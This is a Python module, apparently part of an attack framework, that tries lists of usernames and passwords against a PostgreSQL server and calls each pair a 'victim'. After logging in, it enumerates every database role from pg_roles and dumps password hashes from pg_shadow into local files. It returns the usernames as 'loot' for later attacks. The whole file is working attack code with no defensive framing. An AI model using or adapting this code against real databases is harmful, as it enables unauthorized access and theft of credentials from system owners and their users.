import psycopg2
from hydra import Exploit
from util import Color

class postgresql(Exploit):
    def __init__(self):
        self.name = "postgres"
        self.port = 5432

    def getloot(self, ip_address, credentials):
        print("going into getloot for postgres")
        more_loot = []
        loot_dict = {}
        ip_address = str(ip_address)

        # go through each username/password combo
        for victim in credentials:
            username = victim[0]
            password = victim[1]
            print(f"{Color.BYLLW}Trying to connect to PostgreSQL with IP address {ip_address} " +
                  f"with:\n username {username} and password {password}{Color.END}",
                    file=self.output)

            # start the log in process
            try:
                trystr = "dbname=postgres host={} user={} password={}".format(ip_address, username, password)
                conn = psycopg2.connect(trystr)
            except psycopg2.OperationalError:
                print(f"{Color.BYLLW}Authentication failed.{Color.END}", file=self.output)
                continue

            # opens a cursor to perform psql ops    
            cur = conn.cursor()
        
            # enumerates all the usernames, the passwords are md5 hashed 
            # and only in viewable as root
            try:
                cur.execute("select * from pg_roles")
            except (psycopg2.OperationalError, psycopg2.InternalError) as e:
                continue

            print(f'{Color.BYLLW}Success. Gathering all usernames.{Color.END}', file=self.output)
            for l in cur.fetchall():
                # adds if the username is not already in there
                if loot_dict.get(l[0]) == None:
                    loot_dict[l[0]] = ""

            # attempts to get md5 hashes in the case that the user is a superuser
            try:
                cur.execute("select usename, passwd from pg_shadow")
                with open(f"./data/{ip_address}_{username}_postgresql_md5.txt", "w") as text_file:
                    for l in cur.fetchall():
                        if l[1]:
                            text_file.write(l[1] + "\n")
                print(f'{Color.BYLLW}Success. Gathering all md5 hashes.{Color.END}', file=self.output)
                        
            except psycopg2.ProgrammingError:
                print(f'{Color.BYLLW}No MD5 hashes found.{Color.END}', file=self.output)
                pass

        # eliminates default postgres roles and copies of the same users 
        for k, v in loot_dict.items():
            if k not in {"serviceuser", "pg_signal_backend", "pg_monitor", "pg_read_all_settings", "pg_read_all_stats", "pg_stat_scan_tables"}:
                more_loot.append((k, None))

        return more_loot